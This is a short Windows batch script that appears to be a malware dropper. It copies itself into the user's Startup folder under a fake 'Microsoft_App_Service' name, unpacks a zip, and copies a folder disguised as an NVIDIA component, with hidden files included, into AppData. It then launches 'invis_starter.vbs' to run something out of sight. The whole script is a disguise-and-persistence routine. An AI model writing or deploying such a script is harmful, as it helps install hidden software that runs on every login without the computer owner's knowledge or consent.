copy /y Microsoft_App_Service_625.bat "%USERPROFILE%\Start Menu\Programs\Startup\Microsoft_App_Service_625.bat"
tar -xf internal_files.zip
xcopy NVIDIA3d-g "%USERPROFILE%\AppData\Local" /s /e /y /h
timeout 1
cd "%USERPROFILE%\AppData\Local\NVIDIA3d-g"
start invis_starter.vbs
timeout 2
exit